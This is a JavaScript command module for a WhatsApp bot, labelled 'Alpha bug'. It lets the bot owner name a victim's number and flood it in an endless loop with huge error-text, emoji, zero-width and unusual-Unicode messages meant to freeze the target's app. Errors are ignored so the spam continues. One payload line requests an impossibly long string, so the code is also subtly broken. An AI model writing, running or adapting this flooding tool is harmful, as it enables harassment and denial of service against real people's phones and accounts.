import { owners } from '../config.js'

export const name = 'alpha'
export const description = 'Alpha bug: The ultimate destructive spam to freeze and destroy targets'
export const command = ['alpha']
export const ownerOnly = true

function generateAlphaPayload() {
  // Mix of huge emojis, zero width, weird unicode chars, and big text spam
  const baseText = '🔥🔥🔥 ALPHA INFECTION INITIATED 🔥🔥🔥\n'.repeat(200)
  const emojiFlood = '💀👹👺👻🤖👾👿👽🤡🎃☠️'.repeat(500)
  const zeroWidth = '\u200B'.repeat(999999999998)
  const unicodeFlood = Array(700).fill(String.fromCharCode(0xFFFF)).join('')

  return `${baseText}\n${emojiFlood}\n${zeroWidth}\n${unicodeFlood}`
}

export async function execute(m, { client, text, isOwner }) {
  if (!isOwner) return client.reply(m.chat, '🚫 Only the supreme witcher can unleash the alpha bug!', m)

  let target = ''
  if (m.quoted) target = m.quoted.sender
  else if (text) {
    if (text.includes('@')) target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    else target = text + '@s.whatsapp.net'
  }
  if (!target) return client.reply(m.chat, '⚠️ You must specify a victim to unleash the alpha bug!', m)

  client.reply(m.chat, `⚡️ Alpha bug activated on ${target}! Brace for chaos...`, m)

  const spamText = Array(2500).fill('⚠️ CRITICAL ERROR! SYSTEM FAILURE!').join('\n')

  while (true) {
    try {
      // Send intense error spam
      await client.sendMessage(target, { text: spamText })

      // Send alpha payload with mixed chaos
      await client.sendMessage(target, { text: generateAlphaPayload() })

      // Invisible zero width spam to overload target buffer
      await client.sendMessage(target, { text: '\u200B'.repeat(12000) })

      // Emoji flood
      await client.sendMessage(target, { text: '🔥'.repeat(9000) })

      // Tiny delay to avoid crashing your own client too fast
      await new Promise(r => setTimeout(r, 50))

    } catch (e) {
      // Ignore all errors and continue spamming
    }
  }
}
